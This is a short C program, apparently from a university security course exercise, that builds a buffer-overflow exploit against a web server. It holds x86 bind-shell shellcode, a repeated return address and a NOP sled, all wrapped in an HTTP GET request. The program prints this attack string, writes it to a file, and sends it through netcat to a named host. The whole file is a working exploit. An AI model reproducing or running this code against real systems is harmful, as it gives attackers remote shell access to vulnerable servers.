#include <string.h> 
#include <stdlib.h>
#include <stdio.h>


FILE *fp;
char shellcode[] = "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80\x89\xc7\x52\x66\x68\x08\x49\x43\x66\x53\x89\xe1\xb0\xef\xf6\xd0\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53\x89\xe1\xb0\xf4\xf6\xd0\xcd\x80";
char ret_address[] = "\x08\xec\xff\xff";
char nops[] = "\x90";

int main(int argc, char** argv) {
    int i;
    char* attack_string = (char *)malloc(4096*sizeof (char));
   
   	strcat(attack_string, "echo -e \x22GET /"); 
    
    for (i = 0; i < atoi(argv[1]); i++) {
        strcat(attack_string, ret_address);
    }
    
    for (i= 0; i < atoi(argv[2]); i++) {
        strcat(attack_string, nops);
    }

    strcat(attack_string," HTTP | nc markschreiber-VirtualBox 10071");
    //strcat(attack_string," HTTP | nc 310test.cs.duke.edu 9289");
    
    printf("%s\n", attack_string);
    fp = fopen("shellcode.dat", "w");
    fprintf(fp, "%s", attack_string);
}
   
